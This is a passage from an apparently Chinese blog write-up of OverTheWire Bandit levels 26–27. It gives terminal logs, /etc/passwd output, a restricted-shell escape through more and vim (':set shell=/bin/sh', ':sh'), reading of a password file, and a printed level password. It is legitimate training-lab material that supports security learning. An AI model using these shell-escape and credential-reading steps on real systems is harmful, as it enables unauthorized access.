class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br></pre></td><td class="code"><pre><span class="line">bandit25@bandit:~$ ls</span><br><span class="line">bandit26.sshkey</span><br><span class="line">bandit25@bandit:~$ ssh bandit26@localhost -i bandit26.sshkey </span><br><span class="line">Could not create directory <span class="string">'/home/bandit25/.ssh'</span>.</span><br><span class="line">The authenticity of host <span class="string">'localhost (127.0.0.1)'</span> can<span class="string">'t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no)? yes</span></span><br><span class="line"><span class="string">Failed to add the host to the list of known hosts (/home/bandit25/.ssh/known_hosts).</span></span><br><span class="line"><span class="string">This is a OverTheWire game server. More information on http://www.overthewire.org/wargames</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Linux bandit 4.18.12 x86_64 GNU/Linux</span></span><br><span class="line"><span class="string">               </span></span><br><span class="line"><span class="string">      ,----..            ,----,          .---. </span></span><br><span class="line"><span class="string">     /   /   \         ,/   .`|         /. ./|</span></span><br><span class="line"><span class="string">    /   .     :      ,`   .'</span>  :     .--<span class="string">'.  '</span> ;</span><br><span class="line">   .   /   ;.  \   ;    ;     /    /__./ \ : |</span><br><span class="line">  .   ;   /  ` ; .<span class="string">'___,/    ,'</span> .--<span class="string">'.  '</span>   \<span class="string">' .</span></span><br><span class="line"><span class="string">  ;   |  ; \ ; | |    :     | /___/ \ |    '</span> <span class="string">' </span></span><br><span class="line"><span class="string">  |   :  | ; | '</span> ;    |.<span class="string">';  ; ;   \  \;      : </span></span><br><span class="line"><span class="string">  .   |  '</span> <span class="string">' '</span> : `----<span class="string">'  |  |  \   ;  `      |</span></span><br><span class="line"><span class="string">  '</span>   ;  \; /  |     <span class="string">'   :  ;   .   \    .\  ; </span></span><br><span class="line"><span class="string">   \   \  '</span>,  /      |   |  <span class="string">'    \   \   '</span> \ |</span><br><span class="line">    ;   :    /       <span class="string">'   :  |     :   '</span>  |--<span class="string">"  </span></span><br><span class="line"><span class="string">     \   \ .'        ;   |.'       \   \ ;     </span></span><br><span class="line"><span class="string">  www. `---` ver     '---' he       '---"</span> ire.org     </span><br><span class="line">               </span><br><span class="line">              </span><br><span class="line">Welcome to OverTheWire!</span><br><span class="line"></span><br><span class="line">If you find any problems, please report them to Steven or morla on</span><br><span class="line">irc.overthewire.org.</span><br><span class="line"></span><br><span class="line">--[ Playing the games ]--</span><br><span class="line"></span><br><span class="line">  This machine might hold several wargames. </span><br><span class="line">  If you are playing <span class="string">"somegame"</span>, <span class="keyword">then</span>:</span><br><span class="line"></span><br><span class="line">    * USERNAMES are somegame0, somegame1, ...</span><br><span class="line">    * Most LEVELS are stored <span class="keyword">in</span> /somegame/.</span><br><span class="line">    * PASSWORDS <span class="keyword">for</span> each level are stored <span class="keyword">in</span> /etc/somegame_pass/.</span><br><span class="line"></span><br><span class="line">  Write-access to homedirectories is disabled. It is advised to create a</span><br><span class="line">  working directory with a hard-to-guess name <span class="keyword">in</span> /tmp/.  You can use the</span><br><span class="line">  <span class="built_in">command</span> <span class="string">"mktemp -d"</span> <span class="keyword">in</span> order to generate a random and hard to guess</span><br><span class="line">  directory <span class="keyword">in</span> /tmp/.  Read-access to both /tmp/ and /proc/ is disabled</span><br><span class="line">  so that users can not snoop on eachother. Files and directories with </span><br><span class="line">  easily guessable or short names will be periodically deleted!</span><br><span class="line">4</span><br><span class="line">  Please play nice:</span><br><span class="line">      </span><br><span class="line">    * don<span class="string">'t leave orphan processes running</span></span><br><span class="line"><span class="string">    * don'</span>t leave exploit-files laying around</span><br><span class="line">    * don<span class="string">'t annoy other players</span></span><br><span class="line"><span class="string">    * don'</span>t post passwords or spoilers</span><br><span class="line">    * again, DONT POST SPOILERS! </span><br><span class="line">      This includes writeups of your solution on your blog or website!</span><br><span class="line"></span><br><span class="line">--[ Tips ]--</span><br><span class="line"></span><br><span class="line">  This machine has a 64bit processor and many security-features enabled</span><br><span class="line">  by default, although ASLR has been switched off.  The following</span><br><span class="line">  compiler flags might be interesting:</span><br><span class="line"></span><br><span class="line">    -m32                    compile <span class="keyword">for</span> 32bit</span><br><span class="line">    -fno-stack-protector    <span class="built_in">disable</span> ProPolice</span><br><span class="line">    -Wl,-z,norelro          <span class="built_in">disable</span> relro </span><br><span class="line"></span><br><span class="line">  In addition, the execstack tool can be used to flag the stack as</span><br><span class="line">  executable on ELF binaries.</span><br><span class="line"></span><br><span class="line">  Finally, network-access is limited <span class="keyword">for</span> most levels by a <span class="built_in">local</span></span><br><span class="line">  firewall.</span><br><span class="line"></span><br><span class="line">--[ Tools ]--</span><br><span class="line"></span><br><span class="line"> For your convenience we have installed a few usefull tools <span class="built_in">which</span> you can find</span><br><span class="line"> <span class="keyword">in</span> the following locations:</span><br><span class="line"></span><br><span class="line">    * pwndbg (https://github.com/pwndbg/pwndbg) <span class="keyword">in</span> /usr/<span class="built_in">local</span>/pwndbg/</span><br><span class="line">    * peda (https://github.com/longld/peda.git) <span class="keyword">in</span> /usr/<span class="built_in">local</span>/peda/</span><br><span class="line">    * gdbinit (https://github.com/gdbinit/Gdbinit) <span class="keyword">in</span> /usr/<span class="built_in">local</span>/gdbinit/</span><br><span class="line">    * pwntools (https://github.com/Gallopsled/pwntools)</span><br><span class="line">    * radare2 (http://www.radare.org/)</span><br><span class="line">    * checksec.sh (http://www.trapkit.de/tools/checksec.html) <span class="keyword">in</span> /usr/<span class="built_in">local</span>/bin/checksec.sh</span><br><span class="line"></span><br><span class="line">--[ More information ]--</span><br><span class="line"></span><br><span class="line">  For more information regarding individual wargames, visit</span><br><span class="line">  http://www.overthewire.org/wargames/</span><br><span class="line"></span><br><span class="line">  For support, questions or comments, contact us through IRC on</span><br><span class="line">  irc.overthewire.org <span class="comment">#wargames.</span></span><br><span class="line"></span><br><span class="line">  Enjoy your stay!</span><br><span class="line"></span><br><span class="line">  _                     _ _ _   ___   __  </span><br><span class="line"> | |                   | (_) | |__ \ / /  </span><br><span class="line"> | |__   __ _ _ __   __| |_| |_   ) / /_  </span><br><span class="line"> | <span class="string">'_ \ / _` | '</span>_ \ / _` | | __| / / <span class="string">'_ \ </span></span><br><span class="line"><span class="string"> | |_) | (_| | | | | (_| | | |_ / /| (_) |</span></span><br><span class="line"><span class="string"> |_.__/ \__,_|_| |_|\__,_|_|\__|____\___/ </span></span><br><span class="line"><span class="string">Connection to localhost closed.</span></span><br><span class="line"><span class="string">bandit25@bandit:~$ </span></span><br><span class="line"><span class="string">bandit25@bandit:~$ cat /etc/passwd</span></span><br><span class="line"><span class="string">root:x:0:0:root:/root:/bin/bash</span></span><br><span class="line"><span class="string">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span></span><br><span class="line"><span class="string">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span></span><br><span class="line"><span class="string">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span></span><br><span class="line"><span class="string">sync:x:4:65534:sync:/bin:/bin/sync</span></span><br><span class="line"><span class="string">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span></span><br><span class="line"><span class="string">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span></span><br><span class="line"><span class="string">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span></span><br><span class="line"><span class="string">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span></span><br><span class="line"><span class="string">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span></span><br><span class="line"><span class="string">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span></span><br><span class="line"><span class="string">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span></span><br><span class="line"><span class="string">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span></span><br><span class="line"><span class="string">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span></span><br><span class="line"><span class="string">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span></span><br><span class="line"><span class="string">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span></span><br><span class="line"><span class="string">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span></span><br><span class="line"><span class="string">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span></span><br><span class="line"><span class="string">_apt:x:100:65534::/nonexistent:/bin/false</span></span><br><span class="line"><span class="string">messagebus:x:101:104::/var/run/dbus:/bin/false</span></span><br><span class="line"><span class="string">sshd:x:102:65534::/run/sshd:/usr/sbin/nologin</span></span><br><span class="line"><span class="string">identd:x:103:65534::/var/run/identd:/bin/false</span></span><br><span class="line"><span class="string">ntp:x:104:107::/home/ntp:/bin/false</span></span><br><span class="line"><span class="string">bandit0:x:11000:11000:bandit level 0:/home/bandit0:/bin/bash</span></span><br><span class="line"><span class="string">bandit1:x:11001:11001:bandit level 1:/home/bandit1:/bin/bash</span></span><br><span class="line"><span class="string">bandit10:x:11010:11010:bandit level 10:/home/bandit10:/bin/bash</span></span><br><span class="line"><span class="string">bandit11:x:11011:11011:bandit level 11:/home/bandit11:/bin/bash</span></span><br><span class="line"><span class="string">bandit12:x:11012:11012:bandit level 12:/home/bandit12:/bin/bash</span></span><br><span class="line"><span class="string">bandit13:x:11013:11013:bandit level 13:/home/bandit13:/bin/bash</span></span><br><span class="line"><span class="string">bandit14:x:11014:11014:bandit level 14:/home/bandit14:/bin/bash</span></span><br><span class="line"><span class="string">bandit15:x:11015:11015:bandit level 15:/home/bandit15:/bin/bash</span></span><br><span class="line"><span class="string">bandit16:x:11016:11016:bandit level 16:/home/bandit16:/bin/bash</span></span><br><span class="line"><span class="string">bandit17:x:11017:11017:bandit level 17:/home/bandit17:/bin/bash</span></span><br><span class="line"><span class="string">bandit18:x:11018:11018:bandit level 18:/home/bandit18:/bin/bash</span></span><br><span class="line"><span class="string">bandit19:x:11019:11019:bandit level 19:/home/bandit19:/bin/bash</span></span><br><span class="line"><span class="string">bandit2:x:11002:11002:bandit level 2:/home/bandit2:/bin/bash</span></span><br><span class="line"><span class="string">bandit20:x:11020:11020:bandit level 20:/home/bandit20:/bin/bash</span></span><br><span class="line"><span class="string">bandit21:x:11021:11021:bandit level 21:/home/bandit21:/bin/bash</span></span><br><span class="line"><span class="string">bandit22:x:11022:11022:bandit level 22:/home/bandit22:/bin/bash</span></span><br><span class="line"><span class="string">bandit23:x:11023:11023:bandit level 23:/home/bandit23:/bin/bash</span></span><br><span class="line"><span class="string">bandit24:x:11024:11024:bandit level 24:/home/bandit24:/bin/bash</span></span><br><span class="line"><span class="string">bandit25:x:11025:11025:bandit level 25:/home/bandit25:/bin/bash</span></span><br><span class="line"><span class="string">bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext</span></span><br><span class="line"><span class="string">bandit27:x:11027:11027:bandit level 27:/home/bandit27:/bin/bash</span></span><br><span class="line"><span class="string">bandit28:x:11028:11028:bandit level 28:/home/bandit28:/bin/bash</span></span><br><span class="line"><span class="string">bandit29:x:11029:11029:bandit level 29:/home/bandit29:/bin/bash</span></span><br><span class="line"><span class="string">bandit3:x:11003:11003:bandit level 3:/home/bandit3:/bin/bash</span></span><br><span class="line"><span class="string">bandit30:x:11030:11030:bandit level 30:/home/bandit30:/bin/bash</span></span><br><span class="line"><span class="string">bandit31:x:11031:11031:bandit level 31:/home/bandit31:/bin/bash</span></span><br><span class="line"><span class="string">bandit32:x:11032:11032:bandit level 32:/home/bandit32:/home/bandit32/uppershell</span></span><br><span class="line"><span class="string">bandit33:x:11033:11033:bandit level 33:/home/bandit33:/bin/bash</span></span><br><span class="line"><span class="string">bandit4:x:11004:11004:bandit level 4:/home/bandit4:/bin/bash</span></span><br><span class="line"><span class="string">bandit5:x:11005:11005:bandit level 5:/home/bandit5:/bin/bash</span></span><br><span class="line"><span class="string">bandit6:x:11006:11006:bandit level 6:/home/bandit6:/bin/bash</span></span><br><span class="line"><span class="string">bandit7:x:11007:11007:bandit level 7:/home/bandit7:/bin/bash</span></span><br><span class="line"><span class="string">bandit8:x:11008:11008:bandit level 8:/home/bandit8:/bin/bash</span></span><br><span class="line"><span class="string">bandit9:x:11009:11009:bandit level 9:/home/bandit9:/bin/bash</span></span><br><span class="line"><span class="string">bandit27-git:x:11527:11527::/home/bandit27-git:/usr/bin/git-shell</span></span><br><span class="line"><span class="string">bandit28-git:x:11528:11528::/home/bandit28-git:/usr/bin/git-shell</span></span><br><span class="line"><span class="string">bandit29-git:x:11529:11529::/home/bandit29-git:/usr/bin/git-shell</span></span><br><span class="line"><span class="string">bandit30-git:x:11530:11530::/home/bandit30-git:/usr/bin/git-shell</span></span><br><span class="line"><span class="string">bandit31-git:x:11531:11531::/home/bandit31-git:/usr/bin/git-shell</span></span><br></pre></td></tr></table></figure><p><code>ls</code>有一个ssh私钥连上去之后，连接被关闭了</p><p>根据题目提示我们去看<code>/etc/passwd</code></p><blockquote><p><a href="https://blog.csdn.net/yexiangCSDN/article/details/89963698" target="_blank" rel="noopener">https://blog.csdn.net/yexiangCSDN/article/details/89963698</a></p><p><a href="https://blog.csdn.net/zyy1659949090/article/details/88176215" target="_blank" rel="noopener">https://blog.csdn.net/zyy1659949090/article/details/88176215</a></p><p>/etc/passwd这文件里存放里用户相关信息，包括指定登录shell</p><p>大概格式为：<br><strong>用户名:口令:用户标识号uid:组标识号gid:注释性描述:主目录:指定登录shell</strong></p></blockquote><p>看到26关这一行是一个showtext</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">bandit26:</span><span class="symbol">x:</span><span class="number">11026</span><span class="symbol">:</span><span class="number">11026</span><span class="symbol">:bandit</span> level <span class="number">26</span><span class="symbol">:/home/bandit26</span><span class="symbol">:/usr/bin/showtext</span></span><br></pre></td></tr></table></figure><p>cat查看发现是设置中断类型为linux</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">bandit25@bandit:~$ cat /usr/bin/showtext</span><br><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> TERM=linux</span><br><span class="line"></span><br><span class="line">more ~/text.txt</span><br><span class="line"><span class="built_in">exit</span> 0</span><br><span class="line">bandit25@bandit:~$</span><br></pre></td></tr></table></figure><blockquote><p>tips：</p><p>more，less，vim的退出来的那个都是可以执行命令的</p></blockquote><p>因为这里是more，所以我们把终端缩小</p><p>然后我就卡住了，因为执行的命令都没有回显</p><p>最后看别人的攻略，发现是在more的模式下按<code>v</code>，进入vim模式</p><p>在vim模式下，用<code>:e /etc/bandit_pass/bandit26</code>导入密码文件，得到如下一行</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">5</span>czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z</span><br></pre></td></tr></table></figure><p>长见识了长见识了</p><p>这简直就是个骚操作</p><p>// 在ans.txt中</p><p>### </p><h3 id="level-27"><a href="#level-27" class="headerlink" title="level 27"></a>level 27</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line">bl@bl-virtual-machine:~/wargame$ ssh bandit26@bandit.labs.overthewire.org -p 2220 </span><br><span class="line">This is a OverTheWire game server. More information on http://www.overthewire.org/wargames</span><br><span class="line"></span><br><span class="line">bandit26@bandit.labs.overthewire.org<span class="string">'s password: </span></span><br><span class="line"><span class="string">Linux bandit 4.18.12 x86_64 GNU/Linux</span></span><br><span class="line"><span class="string">               </span></span><br><span class="line"><span class="string">      ,----..            ,----,          .---. </span></span><br><span class="line"><span class="string">     /   /   \         ,/   .`|         /. ./|</span></span><br><span class="line"><span class="string">    /   .     :      ,`   .'</span>  :     .--<span class="string">'.  '</span> ;</span><br><span class="line">   .   /   ;.  \   ;    ;     /    /__./ \ : |</span><br><span class="line">  .   ;   /  ` ; .<span class="string">'___,/    ,'</span> .--<span class="string">'.  '</span>   \<span class="string">' .</span></span><br><span class="line"><span class="string">  ;   |  ; \ ; | |    :     | /___/ \ |    '</span> <span class="string">' </span></span><br><span class="line"><span class="string">  |   :  | ; | '</span> ;    |.<span class="string">';  ; ;   \  \;      : </span></span><br><span class="line"><span class="string">  .   |  '</span> <span class="string">' '</span> : `----<span class="string">'  |  |  \   ;  `      |</span></span><br><span class="line"><span class="string">  '</span>   ;  \; /  |     <span class="string">'   :  ;   .   \    .\  ; </span></span><br><span class="line"><span class="string">   \   \  '</span>,  /      |   |  <span class="string">'    \   \   '</span> \ |</span><br><span class="line">    ;   :    /       <span class="string">'   :  |     :   '</span>  |--<span class="string">"  </span></span><br><span class="line"><span class="string">     \   \ .'        ;   |.'       \   \ ;     </span></span><br><span class="line"><span class="string">  www. `---` ver     '---' he       '---"</span> ire.org     </span><br><span class="line">               </span><br><span class="line">              </span><br><span class="line">Welcome to OverTheWire!</span><br><span class="line"></span><br><span class="line">If you find any problems, please report them to Steven or morla on</span><br><span class="line">irc.overthewire.org.</span><br><span class="line"></span><br><span class="line">--[ Playing the games ]--</span><br><span class="line"></span><br><span class="line">  This machine might hold several wargames. </span><br><span class="line">  If you are playing <span class="string">"somegame"</span>, <span class="keyword">then</span>:</span><br><span class="line"></span><br><span class="line">    * USERNAMES are somegame0, somegame1, ...</span><br><span class="line">    * Most LEVELS are stored <span class="keyword">in</span> /somegame/.</span><br><span class="line">    * PASSWORDS <span class="keyword">for</span> each level are stored <span class="keyword">in</span> /etc/somegame_pass/.</span><br><span class="line"></span><br><span class="line">  Write-access to homedirectories is disabled. It is advised to create a</span><br><span class="line">  working directory with a hard-to-guess name <span class="keyword">in</span> /tmp/.  You can use the</span><br><span class="line">  <span class="built_in">command</span> <span class="string">"mktemp -d"</span> <span class="keyword">in</span> order to generate a random and hard to guess</span><br><span class="line">  directory <span class="keyword">in</span> /tmp/.  Read-access to both /tmp/ and /proc/ is disabled</span><br><span class="line">  so that users can not snoop on eachother. Files and directories with </span><br><span class="line">  easily guessable or short names will be periodically deleted!</span><br><span class="line">4</span><br><span class="line">  Please play nice:</span><br><span class="line">      </span><br><span class="line">    * don<span class="string">'t leave orphan processes running</span></span><br><span class="line"><span class="string">    * don'</span>t leave exploit-files laying around</span><br><span class="line">    * don<span class="string">'t annoy other players</span></span><br><span class="line"><span class="string">    * don'</span>t post passwords or spoilers</span><br><span class="line">    * again, DONT POST SPOILERS! </span><br><span class="line">      This includes writeups of your solution on your blog or website!</span><br><span class="line"></span><br><span class="line">--[ Tips ]--</span><br><span class="line"></span><br><span class="line">  This machine has a 64bit processor and many security-features enabled</span><br><span class="line">  by default, although ASLR has been switched off.  The following</span><br><span class="line">  compiler flags might be interesting:</span><br><span class="line"></span><br><span class="line">    -m32                    compile <span class="keyword">for</span> 32bit</span><br><span class="line">    -fno-stack-protector    <span class="built_in">disable</span> ProPolice</span><br><span class="line">    -Wl,-z,norelro          <span class="built_in">disable</span> relro </span><br><span class="line"></span><br><span class="line">  In addition, the execstack tool can be used to flag the stack as</span><br><span class="line">  executable on ELF binaries.</span><br><span class="line"></span><br><span class="line">  Finally, network-access is limited <span class="keyword">for</span> most levels by a <span class="built_in">local</span></span><br><span class="line">  firewall.</span><br><span class="line"></span><br><span class="line">--[ Tools ]--</span><br><span class="line"></span><br><span class="line"> For your convenience we have installed a few usefull tools <span class="built_in">which</span> you can find</span><br><span class="line"> <span class="keyword">in</span> the following locations:</span><br><span class="line"></span><br><span class="line">    * pwndbg (https://github.com/pwndbg/pwndbg) <span class="keyword">in</span> /usr/<span class="built_in">local</span>/pwndbg/</span><br><span class="line">    * peda (https://github.com/longld/peda.git) <span class="keyword">in</span> /usr/<span class="built_in">local</span>/peda/</span><br><span class="line">    * gdbinit (https://github.com/gdbinit/Gdbinit) <span class="keyword">in</span> /usr/<span class="built_in">local</span>/gdbinit/</span><br><span class="line">    * pwntools (https://github.com/Gallopsled/pwntools)</span><br><span class="line">    * radare2 (http://www.radare.org/)</span><br><span class="line">    * checksec.sh (http://www.trapkit.de/tools/checksec.html) <span class="keyword">in</span> /usr/<span class="built_in">local</span>/bin/checksec.sh</span><br><span class="line"></span><br><span class="line">--[ More information ]--</span><br><span class="line"></span><br><span class="line">  For more information regarding individual wargames, visit</span><br><span class="line">  http://www.overthewire.org/wargames/</span><br><span class="line"></span><br><span class="line">  For support, questions or comments, contact us through IRC on</span><br><span class="line">  irc.overthewire.org <span class="comment">#wargames.</span></span><br><span class="line"></span><br><span class="line">  Enjoy your stay!</span><br><span class="line"></span><br><span class="line">  _                     _ _ _   ___   __  </span><br><span class="line"> | |                   | (_) | |__ \ / /  </span><br><span class="line"> | |__   __ _ _ __   __| |_| |_   ) / /_  </span><br><span class="line"> | <span class="string">'_ \ / _` | '</span>_ \ / _` | | __| / / <span class="string">'_ \ </span></span><br><span class="line"><span class="string"> | |_) | (_| | | | | (_| | | |_ / /| (_) |</span></span><br><span class="line"><span class="string"> |_.__/ \__,_|_| |_|\__,_|_|\__|____\___/ </span></span><br><span class="line"><span class="string">Connection to bandit.labs.overthewire.org closed.</span></span><br></pre></td></tr></table></figure><p>用上一关的flag进入这一关，发现连接又被断开了</p><p>推测方法跟上一关一样，进入more模式，利用vim模式执行命令</p><p>但是这次并不能用<code>:e</code>来读取文件，一i那位权限不够，<code>!command</code>也无法执行</p><p>后来查资料发现vim还可以通过设置shell的目录来执行shell的方式</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># vim模式下</span></span><br><span class="line">:<span class="built_in">set</span> shell=/bin/sh</span><br><span class="line">:sh</span><br></pre></td></tr></table></figure><p>这样就得到了一个shell，ls发现有一个<code>./bandit27-do</code>程序，推测和以前一样，是要给setuid的程序，尝试一下果然没错，直接用此读取密码</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span 